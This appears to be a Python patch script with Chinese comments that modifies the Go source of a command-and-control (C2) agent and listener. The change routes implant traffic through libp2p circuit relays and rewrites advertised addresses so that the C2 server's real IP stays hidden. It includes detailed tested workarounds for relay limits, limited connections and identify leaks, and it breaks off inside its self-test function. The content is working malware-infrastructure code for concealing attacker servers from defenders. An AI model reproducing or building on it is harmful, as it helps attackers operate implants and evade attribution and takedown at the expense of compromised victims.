#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Phase5 批次5：经 circuit relay v2 隐藏 C2 真实 IP。

    python3 patches/l2p_relay.py check|apply|verify|revert|selftest

## 目标

agent 的 profile 里**只有 relay 的地址**，C2 的真实 IP 一次都不出现。
两端各改一处，都极小 —— 真正的工作量在于**搞清楚 relay 为什么"配了也不通"**。

## ★★ 三条实测出来的硬约束（探针 `/root/gp5probe/relaytest/`，2026-09-16）

1. **`NoTransports` 会把 relay 一起关掉。** `options.go:436-438`：
       var NoTransports = func(cfg *Config) error {
           cfg.Transports = nil
           if !cfg.RelayCustom { cfg.RelayCustom = true; cfg.Relay = false }   // ← 顺手关 relay
           return nil
       }
   而 `cfg.Relay` 才是决定要不要装配 `circuitv2.AddTransport` 的开关
   （`config/config.go:350`）⇒ 两端原来都写着 `NoTransports` 且**没有** `EnableRelay()`
   ⇒ agent 手里就算拿到 `/p2p-circuit` 地址也**没有能解析它的传输**。
   ⇒ 必须显式 `libp2p.EnableRelay()`，且**放在 `NoTransports` 之后**（顺序是判据，见下）。

2. **circuit 连接是 `Limited` 连接，`NewStream` 默认拒绝在它上面开流。**
   `swarm/swarm.go:508-515`：
       limitedAllowed, _ := network.GetAllowLimitedConn(ctx)
       if !limitedAllowed && c.Stat().Limited {
           c, err = s.waitForDirectConn(ctx, p)      // ← 等一条**永远不会来**的直连
       }
   实测症状（修之前）：`Connect` 成功（日志有 `finished dialing`）、identify 也成功
   （它自己加了 `WithAllowLimitedConn`）、**业务流永远开不出来**，挂到 ctx 超时 ——
   错误文本是 `failed to open stream: context deadline exceeded`，与"网络慢/对端没起"
   **完全同形**。libp2p 自家的 ping/identify/holepunch 都显式加了，`gostream.Dial` **没有**。

3. **默认 relay 限额会把 C2 会话掐断。** `relayv2.DefaultLimit()` = **2 分钟 / 128 KiB**。
   实测（同一份探针、同一份载荷，唯一变量是 relay 限额）：

   | relay 配置 | 预约拿到的限额 | 200000 B 的流 |
   |---|---|---|
   | `DefaultResources()` | `duration=2m0s data=131072` | **`read=0/200000 err=stream reset`** |
   | `Limit{Duration:1h, Data:1GiB}` | `duration=1h0m0s data=1073741824` | **`read=200000/200000 err=<nil>`** |

   ⇒ **自建 relay 必须显式放宽限额**，否则症状是"会话几分钟后莫名断开"。
   代码改不了对端的 relay，所以这里立的是**判据**：预约回来就比对
   `relayv2.DefaultLimit()`，落在默认档就**大声警告**（见 `axLibp2pReserveLoop`）。

## ★ 第四个问题：地址藏住了，**identify 又把真 IP 送回去了**

探针 Q5 实测（修 AddrsFactory 之前）：即使 agent 只拿到 circuit 地址，
它的 peerstore 里仍然出现了 `/ip4/10.7.34.40/tcp/44973` ——
identify 会把对端的 `h.Addrs()`（= 真实网卡监听地址）送给任何连上来的人。
⇒ 配了 relay 时，listener 用 `AddrsFactory` 把**对外通告**的地址换成 circuit 地址。

## ★ 为什么不用 libp2p 自带的 autorelay（实测否掉，不是偏好）

`autorelay.go:114`：`if r.status != network.ReachabilityPrivate { return addrs }`
—— **只有判定自己"不可达"才通告 relay 地址**。而 C2 listener 是公网可达的
⇒ 它会**预约成功却不通告**，外部行为与"没配 relay"逐字相同。
显式 `relayclient.Reserve` 与可达性判定无关，是确定性的。

## 落点（4 个文件，两端各 2）

    gopher_agent/src_gopher/transport_libp2p.go   imports + opts + gostream.Dial
    gopher_listener_tcp/pl_transport.go            l2p_relays 字段
    gopher_listener_tcp/pl_libp2p.go               opts + AddrsFactory + 预约 + 组合地址
    gopher_listener_tcp/pl_main.go                 Create/Edit 两条路径都组合 circuit 地址

★ **没有 git ⇒ 补丁脚本 + `.bak` 是唯一回滚手段**，所以 REVERT 与 APPLY 写在同一份文件里。
"""
import os
import shutil
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
LST = os.path.dirname(HERE)                      # .../gopher_listener_tcp
AGT = os.path.join(os.path.dirname(LST), "gopher_agent")

F_AGENT = os.path.join(AGT, "src_gopher", "transport_libp2p.go")
F_LTRAN = os.path.join(LST, "pl_transport.go")
F_LL2P = os.path.join(LST, "pl_libp2p.go")
F_LMAIN = os.path.join(LST, "pl_main.go")

BAK = ".bak-relay"          # 回滚点**后缀**；目录见 BAKDIR（批次6：移出交付树）
# ★ 批次6（部署链解阻）：回滚点**不许落在交付树里**。
#   实测真事件：`src_gopher/transport_libp2p.go.bak-relay` 被 `Makefile` 第 12 行的
#   `cp -r src_gopher ./dist/src_gopher` 一起带进 dist ⇒ `l2p_deploy.sh` 的 `pkgsanity`
#   当场 die ⇒ **整条部署链被自己的门拦死**。
#   ★ 门是对的，树是错的：`.bak-*` 是**变更记录级痕迹**（把"这个转发被改过 + 改之前
#   长什么样"连同交付物交给 operator）。**不要为了让门过而把门改松。**
#   ⇒ 回滚点改放 BAKDIR（交付树之外），命名沿用本机既有约定 `<树>.<相对路径>.<后缀>`
#   —— `/root/gp5probe/bak/` 里已有 6 个同约定的文件。**是 mv 不是 delete**：
#   没有 git，回滚点就是唯一回滚手段。
BAKDIR = "/root/gp5probe/bak"

# ---------------------------------------------------------------------------
# 改动清单：(文件, [(旧, 新), ...])。锚点全是**纯文本**，且要求**恰好命中一次**
# —— 命中 0 次说明没打上，命中 2 次说明会打到错的地方，两种都必须拒绝落盘。
# ---------------------------------------------------------------------------

# --- agent：EnableRelay + WithAllowLimitedConn ---
A_OPTS_OLD = ("\t\t\tlibp2p.NoListenAddrs,\n"
              "\t\t\tlibp2p.NoTransports,\n"
              "\t\t\tlibp2p.Transport(tcp.NewTCPTransport),\n")
A_OPTS_NEW = ("\t\t\tlibp2p.NoListenAddrs,\n"
              "\t\t\tlibp2p.NoTransports,\n"
              "\t\t\t// ★★ 必须显式开 relay，且必须**在 NoTransports 之后**：\n"
              "\t\t\t//   NoTransports 见 RelayCustom==false 会顺手把 cfg.Relay 也置 false\n"
              "\t\t\t//   （options.go:436-438），而 cfg.Relay 才是装配 circuit 传输的开关\n"
              "\t\t\t//   （config/config.go:350）⇒ 少了这一行，agent 手里就算有\n"
              "\t\t\t//   /p2p-circuit 地址也**没有能解析它的传输**，且失败得很安静。\n"
              "\t\t\tlibp2p.EnableRelay(),\n"
              "\t\t\tlibp2p.Transport(tcp.NewTCPTransport),\n")

A_DIAL_OLD = "\t\tconn, err := gostream.Dial(ctx, h, ai.ID, proto)\n"
A_DIAL_NEW = ("\t\t// ★★ 经 relay 时**必须**带 WithAllowLimitedConn（批次5 实测）：\n"
              "\t\t//   circuit 连接是 Limited 连接，swarm.NewStream 默认拒绝在它上面开流、\n"
              "\t\t//   转去 waitForDirectConn 等一条永远不会来的直连（swarm.go:508-515）\n"
              "\t\t//   ⇒ Connect 成功、identify 成功、业务流永远开不出来，挂到 ctx 超时。\n"
              "\t\t//   libp2p 自家的 ping/identify/holepunch 都加了，gostream.Dial 没有。\n"
              "\t\tconn, err := gostream.Dial(\n"
              "\t\t\tnetwork.WithAllowLimitedConn(ctx, \"gopher-c2\"), h, ai.ID, proto)\n")

EDITS = [
    (F_AGENT, [
        ('\t"github.com/libp2p/go-libp2p/core/host"\n\t"github.com/libp2p/go-libp2p/core/peer"\n',
         '\t"github.com/libp2p/go-libp2p/core/host"\n'
         '\t"github.com/libp2p/go-libp2p/core/network"\n'
         '\t"github.com/libp2p/go-libp2p/core/peer"\n'),
        (A_OPTS_OLD, A_OPTS_NEW),
        (A_DIAL_OLD, A_DIAL_NEW),
    ]),

    # --- listener：l2p_relays 字段 ---
    (F_LTRAN, [
        ('\tLibp2pPrivKey     string        `json:"l2p_privkey"`\n}',
         '\tLibp2pPrivKey     string        `json:"l2p_privkey"`\n'
         '\n'
         '\t// ---- Phase5 批次5：经 circuit relay v2 隐藏 C2 真实 IP ----\n'
         '\t//\n'
         '\t// 每条是 **relay 自身** 的 multiaddr，必须带 /p2p/<relayPeerID>：\n'
         '\t//   /ip4/203.0.113.9/tcp/4001/p2p/12D3KooW...\n'
         '\t//\n'
         '\t// ★ 不要在这里写 /p2p-circuit —— 那一段由 listener 自己补\n'
         '\t//   （axLibp2pCircuitAddrs）。让 operator 手抄 52 字符的 peer id 已经是\n'
         '\t//   最容易错的一步，不要再让他拼路径。\n'
         '\t//\n'
         '\t// ★ 配了它 ⇒ agent profile 里的地址**自动换成 circuit 地址**，\n'
         '\t//   C2 的真实 IP 不出现在 agent 侧任何地方。\n'
         '\tLibp2pRelays StringOrArray `json:"l2p_relays"`\n'
         '}'),
    ]),

    # --- listener：imports / opts / AddrsFactory / 预约 ---
    (F_LL2P, [
        ('\t"bufio"\n\t"encoding/base64"\n',
         '\t"bufio"\n\t"context"\n\t"encoding/base64"\n'),
        ('\t"github.com/libp2p/go-libp2p/p2p/net/gostream"\n',
         '\t"github.com/libp2p/go-libp2p/p2p/net/gostream"\n'
         '\trelayclient "github.com/libp2p/go-libp2p/p2p/protocol/circuitv2/client"\n'
         '\trelayv2 "github.com/libp2p/go-libp2p/p2p/protocol/circuitv2/relay"\n'),
        ('\t\tlibp2p.NoTransports,\n\t\tlibp2p.Transport(tcp.NewTCPTransport),\n',
         '\t\tlibp2p.NoTransports,\n'
         '\t\t// ★★ 必须在 NoTransports **之后**（options.go:436-438 会把 relay 一起关掉）。\n'
         '\t\tlibp2p.EnableRelay(),\n'
         '\t\tlibp2p.Transport(tcp.NewTCPTransport),\n'),
        ('\treturn libp2p.New(opts...)\n', L_ADDRSFACTORY :=
         '\t// ★ 批次5 隐藏面：identify 会把 h.Addrs()（= 真实网卡监听地址）送给**任何**\n'
         '\t//   连上来的对端 —— 实测 agent 的 peerstore 里出现了 /ip4/10.7.34.40/tcp/44973。\n'
         '\t//   配了 relay 时只对外通告 circuit 地址：既藏住了 C2 的 IP，也把"该拨哪儿"\n'
         '\t//   这件事说全了。\n'
         '\tif len(relayInfos) > 0 {\n'
         '\t\tvar maddrs []ma.Multiaddr\n'
         '\t\tfor _, c := range axLibp2pCircuitAddrs(string(cfg.Libp2pRelays), axLibp2pPeerID(cfg.Libp2pPrivKey)) {\n'
         '\t\t\tif m, merr := ma.NewMultiaddr(c); merr == nil {\n'
         '\t\t\t\tmaddrs = append(maddrs, m)\n'
         '\t\t\t}\n'
         '\t\t}\n'
         '\t\t// ★ 只有真的算出了 circuit 地址才装这个工厂：算出空列表时装上去会**通告零地址**，\n'
         '\t\t//   那比不装更糟 —— 对端连直连兜底都学不到了。\n'
         '\t\tif len(maddrs) > 0 {\n'
         '\t\t\topts = append(opts, libp2p.AddrsFactory(\n'
         '\t\t\t\tfunc([]ma.Multiaddr) []ma.Multiaddr { return maddrs }))\n'
         '\t\t}\n'
         '\t}\n'
         '\treturn libp2p.New(opts...)\n'),
        ('\tport := cfg.PortBind\n',
         '\trelayInfos, rerr := axLibp2pRelayInfos(string(cfg.Libp2pRelays))\n'
         '\tif rerr != nil {\n'
         '\t\treturn nil, rerr\n'
         '\t}\n'
         '\tport := cfg.PortBind\n'),
        ('\tln, err := gostream.Listen(h, proto)\n'
         '\tif err != nil {\n'
         '\t\t_ = h.Close()\n'
         '\t\treturn nil, err\n'
         '\t}\n'
         '\treturn &axLibp2pListener{Listener: ln, h: h}, nil\n'
         '}\n',
         '\tln, err := gostream.Listen(h, proto)\n'
         '\tif err != nil {\n'
         '\t\t_ = h.Close()\n'
         '\t\treturn nil, err\n'
         '\t}\n'
         '\t// ★ 预约必须在 gostream.Listen **之后**才启动：预约成功后 relay 立刻就可能\n'
         '\t//   转发入站连接，此时流处理器还没注册的话，第一个 agent 会看到 stream reset，\n'
         '\t//   而日志里只有一行"预约成功"。\n'
         '\tctx, cancel := context.WithCancel(context.Background())\n'
         '\tif len(relayInfos) > 0 {\n'
         '\t\taxLibp2pRelayKeep(ctx, h, relayInfos)\n'
         '\t}\n'
         '\treturn &axLibp2pListener{Listener: ln, h: h, cancel: cancel}, nil\n'
         '}\n'),
        ('type axLibp2pListener struct {\n'
         '\tnet.Listener\n'
         '\th host.Host\n'
         '}\n'
         '\n'
         'func (l *axLibp2pListener) Close() error {\n'
         '\terr := l.Listener.Close()\n'
         '\t_ = l.h.Close()\n'
         '\treturn err\n'
         '}\n',
         'type axLibp2pListener struct {\n'
         '\tnet.Listener\n'
         '\th host.Host\n'
         '\t// ★ 批次5：预约/续约 goroutine 的取消信号。不取消就是纯泄漏 ——\n'
         '\t//   它会一直拿着 host 重试，而 host 已经被 Close 了。\n'
         '\tcancel context.CancelFunc\n'
         '}\n'
         '\n'
         'func (l *axLibp2pListener) Close() error {\n'
         '\tif l.cancel != nil {\n'
         '\t\tl.cancel()\n'
         '\t}\n'
         '\terr := l.Listener.Close()\n'
         '\t_ = l.h.Close()\n'
         '\treturn err\n'
         '}\n'),
    ]),

    # ★ 实测补丁：relayInfos 的作用域。axLibp2pHost 里那份是它自己的局部变量，
    #   跨不过函数边界 —— 第一版编译报 `undefined: relayInfos`。
    (F_LL2P, [
        ('func axListenLibp2p(cfg TransportConfig) (net.Listener, error) {\n\th, err := axLibp2pHost(cfg)\n',
         'func axListenLibp2p(cfg TransportConfig) (net.Listener, error) {\n'
         '\t// ★ relayInfos 必须在这个函数里**自己**解析一份：axLibp2pHost 里那份是它自己的\n'
         '\t//   局部变量，跨不过函数边界（这是实测的编译错误 `undefined: relayInfos`）。\n'
         '\trelayInfos, err := axLibp2pRelayInfos(string(cfg.Libp2pRelays))\n'
         '\tif err != nil {\n'
         '\t\treturn nil, err\n'
         '\t}\n'
         '\th, err := axLibp2pHost(cfg)\n'),
    ]),

    # --- listener：Create / Edit 两条路径都要组合 circuit 地址 ---
    (F_LMAIN, [
        ('\tif pre.PortBind < 1 {\n'
         '\t\tp, perr := axLibp2pBindPort(string(pre.Callback_addresses))\n'
         '\t\tif perr != nil {\n'
         '\t\t\treturn config, perr\n'
         '\t\t}\n'
         '\t\tpre.PortBind = p\n'
         '\t}\n',
         '\tif pre.PortBind < 1 {\n'
         '\t\tp, perr := axLibp2pBindPort(string(pre.Callback_addresses))\n'
         '\t\tif perr != nil {\n'
         '\t\t\treturn config, perr\n'
         '\t\t}\n'
         '\t\tpre.PortBind = p\n'
         '\t}\n'
         '\t// ★ 批次5：配了 relay ⇒ 自动把 agent 该拨的 circuit 地址组合出来。\n'
         '\t//   这是"隐藏 C2 IP"成为**默认行为**而不是"要人记得去填"的那一步。\n'
         '\tif err := axFillLibp2pRelayAddrs(&pre); err != nil {\n'
         '\t\treturn config, err\n'
         '\t}\n'),
        ('\tif conf.Libp2pPrivKey != "" {\n'
         '\t\tl.transport.Config.Libp2pPrivKey = conf.Libp2pPrivKey\n'
         '\t}\n',
         '\tif conf.Libp2pPrivKey != "" {\n'
         '\t\tl.transport.Config.Libp2pPrivKey = conf.Libp2pPrivKey\n'
         '\t}\n'
         '\t// ★ 批次5：relay 字段必须一起同步 —— 与上面 Protocol 同一个坑：\n'
         '\t//   漏掉它，编辑过的 listener 会**静默丢掉** relay 配置，UI 上却还显示着。\n'
         '\tl.transport.Config.Libp2pRelays = conf.Libp2pRelays\n'
         '\tif err := axFillLibp2pRelayAddrs(&l.transport.Config); err != nil {\n'
         '\t\treturn listenerData, customdData, err\n'
         '\t}\n'),
    ]),
]

# 追加到 pl_libp2p.go 末尾的新函数（不参与锚点匹配，只在 apply 时贴一次）
NEW_FUNCS = '''
// ---------------------------------------------------------------------------
// Phase5 批次5：circuit relay v2 预约（隐藏 C2 真实 IP）
// ---------------------------------------------------------------------------

// axRelayRenewFloor 是续约/重试的**下限**间隔。
// ★ 取值理由：relayv2 的 ReservationTTL 默认 1h，半程续约 = 30min；失败重试若没有
//
//	下限，一次瞬时 DNS/网络抖动会变成忙等（每 30s 一次的握手风暴，反而更像异常流量）。
const axRelayRenewFloor = 3 * time.Minute

// axRelayHandshakeTimeout 是单次预约的预算。与 relay 建流要走 Noise + yamux。
const axRelayHandshakeTimeout = 30 * time.Second

// axLibp2pRelayInfos 解析 l2p_relays。
//
// ★ 每条都必须带 /p2p/<relayPeerID>：relay 的 peer id 就是预约的路由键，
//
//	没有它 libp2p 连"找谁预约"都不知道。这里**拒绝落盘**而不是跳过该条 ——
//	跳过一条的后果是"以为配了两个 relay，实际只预约上一个"。
//
// ★ 反过来，地址里**不该**出现 /p2p-circuit：那一段由 axLibp2pCircuitAddrs 补。
//
//	把完整的 circuit 地址填进来是个很自然的误用，而它的症状是"预约失败"，
//	看不出是填错了 —— 所以直接拒掉并说清楚该填什么。
func axLibp2pRelayInfos(raw string) ([]peer.AddrInfo, error) {
	out := make([]peer.AddrInfo, 0, 2)
	for _, a := range axSplitAddrs(raw) {
		a = strings.TrimSpace(a)
		if a == "" {
			continue
		}
		m, err := ma.NewMultiaddr(a)
		if err != nil {
			return nil, fmt.Errorf("l2p_relays: 不是合法 multiaddr: %s (%v)", a, err)
		}
		if _, err := m.ValueForProtocol(ma.P_CIRCUIT); err == nil {
			return nil, errors.New("l2p_relays: " + a + " 里不应含 /p2p-circuit —— " +
				"这里填 relay **自身**的地址 /ip4/.../tcp/.../p2p/<relayPeerID>，" +
				"/p2p-circuit 那段由 listener 自己补")
		}
		ai, err := peer.AddrInfoFromP2pAddr(m)
		if err != nil {
			return nil, fmt.Errorf("l2p_relays: %s 缺 /p2p/<relayPeerID>（relay 的 peer id "+
				"就是预约的路由键，没有它预约不上）: %v", a, err)
		}
		out = append(out, *ai)
	}
	return out, nil
}

// axLibp2pCircuitAddrs 把 relay 地址组合成 **agent 该拨的** circuit 地址。
//
// 形式：<relayAddr>/p2p-circuit/p2p/<selfPeerID>
// ★ 末尾的 selfPeerID 是必须的：relay 靠它知道转发给谁；agent 也靠它做 Noise 握手
//
//	的身份校验。少了它 peer.AddrInfoFromP2pAddr 会把 relay 的 id 当成目标。
func axLibp2pCircuitAddrs(relayRaw, selfID string) []string {
	if selfID == "" {
		return nil
	}
	out := make([]string, 0, 2)
	for _, a := range axSplitAddrs(relayRaw) {
		a = strings.TrimSuffix(strings.TrimSpace(a), "/")
		if a == "" {
			continue
		}
		out = append(out, a+"/p2p-circuit/p2p/"+selfID)
	}
	return out
}

// axFillLibp2pRelayAddrs 在"配了 relay 且**没有**显式给 l2p_addrs"时，
// 把 agent 该拨的 circuit 地址组合进 Libp2pAddrs。
//
// ★ 显式给了 l2p_addrs 就以它为准（operator 可能想同时留一条直连做兜底）；
//
//	没给才自动组合 ⇒ "隐藏 C2 IP"是默认行为，不依赖人记得去填。
//
// ★ 算不出地址时**返回错误**，不静默跳过：跳过等于 agent 拿不到任何地址，
//
//	而 UI 上 listener 一切正常 —— 这正是本项目反复归档的那类"静默走错"。
func axFillLibp2pRelayAddrs(c *TransportConfig) error {
	relays, err := axLibp2pRelayInfos(string(c.Libp2pRelays))
	if err != nil {
		return err
	}
	if len(relays) == 0 {
		return nil
	}
	if len(axSplitAddrs(string(c.Libp2pAddrs))) > 0 {
		return nil
	}
	circ := axLibp2pCircuitAddrs(string(c.Libp2pRelays), axLibp2pPeerID(c.Libp2pPrivKey))
	if len(circ) == 0 {
		return errors.New("l2p_relays 已配但算不出 circuit 地址（l2p_privkey 不可用？）")
	}
	c.Libp2pAddrs = StringOrArray(strings.Join(circ, ", "))
	return nil
}

// axLibp2pRelayKeep 对每条 relay 维持一个 circuit v2 **预约**，直到 ctx 结束。
//
// ★ 为什么是显式预约而不是 libp2p 的 autorelay（实测否掉）：
//
//	autorelay.go:114 `if r.status != network.ReachabilityPrivate { return addrs }`
//	—— 它只在判定自己"不可达"时才通告 relay 地址。C2 listener 是公网可达的
//	⇒ 它会预约成功却**不通告**，外部行为与"没配 relay"逐字相同。
//	显式预约与可达性判定无关。
func axLibp2pRelayKeep(ctx context.Context, h host.Host, relays []peer.AddrInfo) {
	for _, ri := range relays {
		go axLibp2pReserveLoop(ctx, h, ri)
	}
}

func axLibp2pReserveLoop(ctx context.Context, h host.Host, ri peer.AddrInfo) {
	// ★ 用**上游的默认限额**当"已知会掐断"的标尺，不写死数字：
	//   实测默认档（2m / 128KiB）下 200000 B 的流会被 relay `stream reset`，
	//   放宽到 1h/1GiB 后同一份代码同一份载荷通过 ⇒ 归因干净。
	//   引用 DefaultLimit() 而不是抄一份常量，上游改了我们跟着改。
	bad := relayv2.DefaultLimit()
	for {
		rctx, cancel := context.WithTimeout(ctx, axRelayHandshakeTimeout)
		rsv, err := relayclient.Reserve(rctx, h, ri)
		cancel()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			fmt.Printf("  [relay] 预约失败 relay=%s: %v（%s 后重试）\\n",
				ri.ID, err, axRelayRenewFloor)
			if !axSleepCtx(ctx, axRelayRenewFloor) {
				return
			}
			continue
		}
		fmt.Printf("  [relay] 预约成功 relay=%s 到期=%s 限额=%s/%d 字节\\n",
			ri.ID, rsv.Expiration.Format(time.RFC3339), rsv.LimitDuration, rsv.LimitData)
		if bad.Data > 0 && rsv.LimitData <= uint64(bad.Data) { // ★ LimitData 是 uint64、RelayLimit.Data 是 int64（实测编译错误）
			fmt.Printf("  [relay] ★警告 relay=%s 单条电路上限只有 %d 字节（上游默认 %d）—— "+
				"实测这个量级会把 C2 会话**掐断**（stream reset）。请在 relay 侧用 "+
				"relayv2.WithResources 放宽 Limit.Data\\n", ri.ID, rsv.LimitData, bad.Data)
		}
		if rsv.LimitDuration > 0 && rsv.LimitDuration <= bad.Duration {
			fmt.Printf("  [relay] ★警告 relay=%s 单条电路时限只有 %s（上游默认 %s）—— "+
				"超过它的会话会被 relay 重置。请在 relay 侧放宽 Limit.Duration\\n",
				ri.ID, rsv.LimitDuration, bad.Duration)
		}
		// 半程续约：留一半余量，避免"刚好在过期那一刻续约"。
		wait := time.Until(rsv.Expiration) / 2
		if wait < axRelayRenewFloor {
			wait = axRelayRenewFloor
		}
		if !axSleepCtx(ctx, wait) {
			return
		}
	}
}

// axSleepCtx 睡 d；ctx 结束则返回 false（调用方据此退出）。
func axSleepCtx(ctx context.Context, d time.Duration) bool {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
		return false
	case <-t.C:
		return true
	}
}
'''


# ---------------------------------------------------------------------------
# 判据
# ---------------------------------------------------------------------------

def _after(text, a, b):
    """a 必须出现，且**排在** b 之后。任一条不成立即 False。
    ★ 顺序是判据不是洁癖：EnableRelay 放到 NoTransports 之前，NoTransports 会
      因为 RelayCustom 已为 true 而放过 relay —— 表面上"加了这一行"，实际生效与否
      取决于顺序。这类"看着加了其实没生效"正是本批次要拦的东西。"""
    if a not in text or b not in text:
        return False
    return text.index(a) > text.index(b)


CHECKS = [
    ("agent: EnableRelay() 加在 NoTransports **之后**",
     lambda T: _after(T["agent"], "libp2p.EnableRelay(),", "libp2p.NoTransports,")),
    ("agent: 开流带 WithAllowLimitedConn（否则 circuit 上永远开不出流）",
     lambda T: "gostream.Dial(\n\t\t\tnetwork.WithAllowLimitedConn(" in T["agent"]),
    ("agent: 引入了 core/network",
     lambda T: '"github.com/libp2p/go-libp2p/core/network"' in T["agent"]),
    ("listener: EnableRelay() 加在 NoTransports 之后",
     lambda T: _after(T["ll2p"], "libp2p.EnableRelay(),", "libp2p.NoTransports,")),
    ("listener: l2p_relays 字段（json tag 就是协议）",
     lambda T: 'json:"l2p_relays"' in T["ltran"]),
    ("listener: 配了 relay 就用 AddrsFactory 换掉对外通告的直连地址（identify 泄漏面）",
     lambda T: "libp2p.AddrsFactory(" in T["ll2p"] and "axLibp2pCircuitAddrs(" in T["ll2p"]),
    ("listener: 预约在 gostream.Listen **之后**启动",
     lambda T: _after(T["ll2p"], "axLibp2pRelayKeep(", "ln, err := gostream.Listen(h, proto)")),
    ("listener: 限额判据引用 relayv2.DefaultLimit()（不写死数字）",
     lambda T: "relayv2.DefaultLimit()" in T["ll2p"]),
    ("listener: listener 关闭时取消预约 goroutine（否则泄漏）",
     lambda T: "l.cancel()" in T["ll2p"]),
    ("listener: Create 路径组合 circuit 地址",
     lambda T: "axFillLibp2pRelayAddrs(&pre)" in T["lmain"]),
    ("listener: Edit 路径同步 l2p_relays 并重新组合（漏了就静默丢配置）",
     lambda T: "Config.Libp2pRelays = conf.Libp2pRelays" in T["lmain"]
     and "axFillLibp2pRelayAddrs(&l.transport.Config)" in T["lmain"]),
    ("listener: axListenLibp2p 自己也解析一份 relay（作用域跨不过函数边界）",
     lambda T: "\trelayInfos, err := axLibp2pRelayInfos(string(cfg.Libp2pRelays))\n"
                "\tif err != nil {\n"
                "\t\treturn nil, err\n"
                "\t}\n"
                "\th, err := axLibp2pHost(cfg)" in T["ll2p"]),
]

# selftest 用的"定点破坏"：(说明, 文件键, [(旧,新)...], 该红的判据下标)
BREAKS = [
    ("agent 忘了加 EnableRelay", "agent",
     [("libp2p.EnableRelay(),\n", "")], 0),
    ("agent 把 EnableRelay 挪到 NoTransports 之前", "agent",
     [("\t\t\tlibp2p.EnableRelay(),\n", ""),
      ("\t\t\tlibp2p.NoTransports,\n",
       "\t\t\tlibp2p.EnableRelay(),\n\t\t\tlibp2p.NoTransports,\n")], 0),
    ("agent 用回裸 ctx（去掉 WithAllowLimitedConn）", "agent",
     [("\t\t\tnetwork.WithAllowLimitedConn(ctx, \"gopher-c2\"), h, ai.ID, proto)",
       "ctx, h, ai.ID, proto)")], 1),
    ("agent 没引入 core/network", "agent",
     [("\t\"github.com/libp2p/go-libp2p/core/network\"\n", "")], 2),
    ("listener 忘了加 EnableRelay", "ll2p",
     [("libp2p.EnableRelay(),\n", "")], 3),
    ("listener 漏了 l2p_relays 字段", "ltran",
     [('Libp2pRelays StringOrArray `json:"l2p_relays"`\n', "")], 4),
    ("listener 去掉了 AddrsFactory（identify 会把真 IP 送出去）", "ll2p",
     [("\t\tif len(maddrs) > 0 {\n"
       "\t\t\topts = append(opts, libp2p.AddrsFactory(\n"
       "\t\t\t\tfunc([]ma.Multiaddr) []ma.Multiaddr { return maddrs }))\n"
       "\t\t}\n",
       "\t\t_ = maddrs\n")], 5),
    ("listener 把预约挪到 gostream.Listen 之前（流处理器还没注册）", "ll2p",
     [("\t\taxLibp2pRelayKeep(ctx, h, relayInfos)\n", ""),
      ("\tln, err := gostream.Listen(h, proto)\n",
       "\taxLibp2pRelayKeep(ctx, h, relayInfos)\n\tln, err := gostream.Listen(h, proto)\n")], 6),
    ("listener 把限额标尺写成写死的数字", "ll2p",
     [("relayv2.DefaultLimit()", "struct {\n\t\tDuration time.Duration\n\t\tData     uint64\n\t}{2 * time.Minute, 1 << 17}")], 7),
    ("listener 忘了在 Close 里取消预约 goroutine", "ll2p",
     [("\t\tl.cancel()\n", "")], 8),
    ("Create 路径不再组合 circuit 地址", "lmain",
     [("axFillLibp2pRelayAddrs(&pre)", "_ = pre")], 9),
    ("Edit 路径漏同步 relay 字段", "lmain",
     [("\tl.transport.Config.Libp2pRelays = conf.Libp2pRelays\n", "")], 10),
    ("axListenLibp2p 不再自己解析 relay（relayInfos 越界）", "ll2p",
     [('\trelayInfos, err := axLibp2pRelayInfos(string(cfg.Libp2pRelays))\n'
       '\tif err != nil {\n'
       '\t\treturn nil, err\n'
       '\t}\n', "")], 11),
]


# 路径 → T 里的短键。★ 单独放一处：state/apply 里各写过一份字面量，
# 漏掉 F_AGENT 那次直接 KeyError（本脚本第一次 check 就是这么炸的）——
# 同一张表抄两遍，错一次就够。
KEYOF = {F_AGENT: "agent", F_LTRAN: "ltran", F_LL2P: "ll2p", F_LMAIN: "lmain"}


def load():
    T = {}
    for key, path in (("agent", F_AGENT), ("ltran", F_LTRAN),
                      ("ll2p", F_LL2P), ("lmain", F_LMAIN)):
        if not os.path.exists(path):
            print("[BAD ] 找不到 %s" % path)
            return None
        T[key] = open(path, encoding="utf-8").read()
    return T


def run_checks(T):
    out = []
    for name, fn in CHECKS:
        try:
            ok = bool(fn(T))
        except Exception as e:                       # 判据自己炸了 ⇒ 必须红，不能当通过
            ok = False
            name = name + "（判据异常: %r）" % (e,)
        out.append((name, ok))
    return out


def applied(T):
    """在内存里把 EDITS 施加一遍（selftest 的基线）。

    ★ 这样"判据自证"不依赖磁盘上的树处于哪种状态 —— apply **之前**就能证明每条判据
    都有判别力。否则只有两种结局：要么先改代码再自证（那"改之前它是红的"就永远
    没被观察到），要么自证被跳过。
    """
    M = dict(T)
    for path, pairs in EDITS:
        key = KEYOF[path]
        t = M[key]
        for old, new in pairs:
            assert t.count(old) == 1, "%s 锚点命中 %d 次（应为 1）" % (os.path.basename(path), t.count(old))
            t = t.replace(old, new, 1)
        M[key] = t
    # ★ NEW_FUNCS 在**全部 EDITS 之后**只追加一次。原先写在"每个 ll2p 条目"里，
    #   而本文件后来为 pl_libp2p.go 增加了第二个条目 ⇒ 整段新函数被贴了两遍，
    #   判据锚点随即命中 2 次（自证直接报"锚点命中 2 次 ⇒ 自证不成立"抓到）。
    M["ll2p"] = M["ll2p"] + NEW_FUNCS
    return M


def selftest(T):
    """★ 门要**能红也能绿**才算门：每条判据都必须能被一次定点破坏打红。

    没有这一段，"11 项全过"与"判据写错了、恒真"在输出上完全一样 ——
    本项目的归档里这种假绿已经出现过五次。
    """
    s, _, _, _ = state(T)
    if s == "old":
        try:
            T = applied(T)          # 未施加 ⇒ 用内存施加后的文本当基线
        except AssertionError as e:
            print("  [FAIL] 内存施加失败：%s ⇒ 判据无从自证" % e)
            return False
    elif s != "done":
        print("  [FAIL] 树处于中间态（%s）⇒ 自证与实测都不可信" % s)
        return False
    # s == "done" ⇒ 直接拿**真树**当基线（这才是真正的端到端自证）
    base = run_checks(T)
    bad = [n for n, ok in base if not ok]
    if bad:
        print("  [FAIL] 基线（内存施加后）上有 %d 条判据是红的，先修它们再看自证：" % len(bad))
        for n in bad:
            print("         %s" % n)
        return False
    print("  [ok  ] 内存施加后 %d 条判据全绿（基线）" % len(base))
    allok = True
    for desc, key, pairs, idx in BREAKS:
        M = dict(T)
